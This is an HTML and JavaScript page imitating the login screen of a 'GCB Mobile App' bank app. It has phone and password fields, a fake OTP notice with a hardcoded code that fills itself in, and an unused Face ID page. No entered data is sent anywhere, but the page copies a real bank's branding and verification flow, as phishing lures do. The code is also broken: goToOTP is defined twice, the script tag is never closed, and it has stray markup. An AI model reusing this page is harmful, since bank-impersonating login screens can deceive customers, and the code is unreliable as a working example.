<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GCB Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<!-- LOGIN PAGE -->
<div class="container" id="loginPage">
  <h2>  Welcome to the GCB <br> Mobile App</h2>

  <img src="gcb-image.jpeg" class="top-image">

  <p class="login-text">Login</p>

  <div class="input-row">
    <i class="fa-solid fa-phone"></i>
    <img src="phone.jpeg"width="40px" height="40px"><img src="https://flagcdn.com/w40/gh.png" class="flag">
    <span>233</span>
    <input type="text" placeholder="Enter Mobile Number">
  </div>

  <div class="input-row">
    <i class="fa-solid fa-lock"></i>
    <img src="lock.jpeg"width="50px" height="50px">
    <input type="password" placeholder="Enter Password">
  </div>

  <div class="forgot">Forgot Password</div>

  <button class="login-btn" onclick="goToOTP()">Login</button>

  <p class="register">Are you new to this app? <span>Register</span></p>

  <!-- Help Icon -->
<div class="help-icon">?</div><br>

  <p class="version">Version: 2.12</p>
</div>

<div id="otpPage" class="hidden">
  <!-- Notification at the top -->
  <div id="otpNotification" class="otp-notification hidden">
    Y`ello cherished Customer, do not share your code with our employees or anyone. <br>
    Your code is: <strong>349845</strong>
  </div>

  <!-- OTP horizontal input bar -->
  <input type="text" id="otpInput" class="otp-input" disabled>
</div>

  
</div>
<!-- FACE ID PAGE -->
<div class="container hidden" id="facePage">
  <h2>Face ID Verification</h2>

  <div class="face-box">
    <div class="scan-line"></div>
  </div>

  <p class="info">Scanning your face...</p>
</div>

<script>
function goToOTP() {
  document.getElementById("loginPage").classList.add("hidden");
  document.getElementById("otpPage").classList.remove("hidden");

   setTimeout(() => {
    alert("Y`ello cherished Customer, do not share your code with our employees or anyone.Your code is:349845. 3XTsOSAuJcW \n\n\n\nENTER YOUR OTP FOR VERIFICATION");
  }, 3000);
}

function goToFace() {
  document.getElementById("otpPage").classList.add("hidden");
  document.getElementById("facePage").classList.remove("hidden");

}


function goToOTP() {
  // Hide login page, show OTP page
  document.getElementById("loginPage").classList.add("hidden");
  document.getElementById("otpPage").classList.remove("hidden");

  // Show top notification
  const notification = document.getElementById("otpNotification");
  notification.classList.remove("hidden");

  // Auto-fill OTP into horizontal bar
  const otpCode = "349845";
  const otpInput = document.getElementById("otpInput");

  let i = 0;
  const interval = setInterval(() => {
    if (i < otpCode.length) {
      otpInput.value = otpCode.slice(0, i + 1); // progressively fill
      i++;
    } else {
      clearInterval(interval);
    }
  }, 500); // fills one digit every 0.5s
}


</body>
</html>
